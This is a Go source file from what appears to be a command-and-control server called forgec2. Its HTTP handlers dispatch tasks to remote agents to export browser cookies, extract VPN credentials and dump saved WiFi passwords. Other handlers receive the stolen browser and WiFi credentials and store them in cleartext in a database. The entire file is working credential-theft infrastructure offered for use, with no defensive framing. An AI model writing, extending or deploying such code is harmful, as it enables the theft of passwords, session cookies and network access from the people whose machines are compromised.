package server

import (
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

// handleCookieExport dispatches cookie_export task to the agent.
func (s *Server) handleCookieExport(c *gin.Context) {
	id := c.Param("id")
	browser := c.PostForm("browser")
	if browser == "" {
		browser = c.Query("browser")
	}
	if browser == "" {
		browser = "all"
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "cookie_export", browser, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	s.LogAuditRecord(c, "cookie_export", "agent", id, "Cookie export: "+browser, true, nil)
	s.dispatchTask(c, task, "cookie_export", "Cookie export: "+browser)
}

// handleVpnCreds dispatches vpn_creds task to the agent.
func (s *Server) handleVpnCreds(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "vpn_creds", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	s.LogAuditRecord(c, "vpn_creds", "agent", id, "VPN credential extraction", true, nil)
	s.dispatchTask(c, task, "vpn_creds", "VPN credential extraction")
}

// handleWifiCreds handles WiFi credential extraction
func (s *Server) handleWifiCreds(c *gin.Context) {
	user := c.GetString("username")
	agentID := c.Param("id")

	// Create task
	task := db.Task{
		AgentID:   agentID,
		Type:      "wifi_creds",
		Command:   "wifi_creds:all",
		Status:    "pending",
		CreatedBy: user,
		CreatedAt: time.Now(),
		UpdatedAt: time.Now(),
	}

	if err := s.db.Create(&task).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create WiFi credential extraction task"})
		return
	}

	// Log audit
	s.LogAuditRecord(c, "wifi_credential_extraction",
		fmt.Sprintf("WiFi credential extraction task %d created", task.ID),
		agentID, "Extracting all saved WiFi profiles and passwords",
		true, nil)

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"task_id": task.ID,
		"message": "WiFi credential extraction started",
	})
}

// handleProcessBrowserResult processes browser credential results from agent
func (s *Server) handleProcessBrowserResult(c *gin.Context) {
	var req struct {
		TaskID      uint     `json:"task_id"`
		AgentID     string   `json:"agent_id"`
		Credentials []string `json:"credentials"` // JSON array of credential strings
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	// Parse and store credentials
	created := 0
	for _, credStr := range req.Credentials {
		// Expected format: browser|url|username|password|cookie_data
		// This will be parsed by the agent and sent in structured format
		cred := db.CredentialEntry{
			AgentID: req.AgentID,
			Source:  "browser",
			Type:    "cleartext",
			TaskID:  req.TaskID,
			Notes:   credStr,
		}

		if err := s.db.Create(&cred).Error; err == nil {
			created++
		}
	}

	// Update task
	s.db.Model(&db.Task{}).Where("id = ?", req.TaskID).Updates(map[string]interface{}{
		"status": "completed",
		"result": fmt.Sprintf("Extracted %d browser credentials", created),
	})

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"created": created,
		"message": fmt.Sprintf("Stored %d browser credentials", created),
	})
}

// handleProcessWifiResult processes WiFi credential results
func (s *Server) handleProcessWifiResult(c *gin.Context) {
	var req struct {
		TaskID   uint     `json:"task_id"`
		AgentID  string   `json:"agent_id"`
		Networks []string `json:"networks"` // SSID:Password format
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}

	// Parse and store WiFi credentials
	created := 0
	for _, network := range req.Networks {
		// Format: SSID:Password
		parts := strings.Split(network, ":")
		if len(parts) < 2 {
			continue
		}
		ssid := strings.TrimSpace(parts[0])
		password := strings.TrimSpace(parts[1])

		cred := db.CredentialEntry{
			AgentID:  req.AgentID,
			Username: ssid,
			Password: password,
			Source:   "wifi",
			Type:     "cleartext",
			TaskID:   req.TaskID,
		}

		if err := s.db.Create(&cred).Error; err == nil {
			created++
		}
	}

	// Update task
	s.db.Model(&db.Task{}).Where("id = ?", req.TaskID).Updates(map[string]interface{}{
		"status": "completed",
		"result": fmt.Sprintf("Extracted %d WiFi credentials", created),
	})

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"created": created,
		"message": fmt.Sprintf("Stored %d WiFi credentials", created),
	})
}
